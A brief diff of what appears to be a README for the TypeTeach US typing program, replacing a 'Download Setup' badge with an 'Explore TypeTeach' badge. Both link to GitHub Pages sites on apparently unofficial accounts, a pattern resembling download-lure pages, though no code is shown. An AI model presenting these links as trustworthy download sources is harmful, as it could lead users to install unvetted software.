@@ -2,7 +2,7 @@
 
 ![TypeTeach US Icon](https://static.macupdate.com/products/51456/l/typeteach-us-logo.png?v=1568322641)
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://abdullahdavilalvsm.github.io/.github/TypeTeach-US)
+[![Explore TypeTeach](https://img.shields.io/badge/Explore-TypeTeach-7C3AED?style=flat-square)](https://mastery-typeteach.github.io/.github/)
 
 ---
 
